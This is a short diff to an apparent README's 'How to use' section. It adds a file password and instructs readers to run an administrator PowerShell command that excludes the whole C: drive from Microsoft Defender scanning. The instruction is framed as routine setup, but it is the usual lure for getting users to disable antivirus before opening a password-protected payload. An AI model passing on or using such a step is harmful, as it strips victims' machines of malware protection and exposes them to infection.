@@ -1,3 +1,5 @@
+# File password: PissEngineW
+
 # How to use
 
 First, you need to run the following powershell command (RUN AS ADMIN!) : Add-MpPreference -ExclusionPath "C:\\"
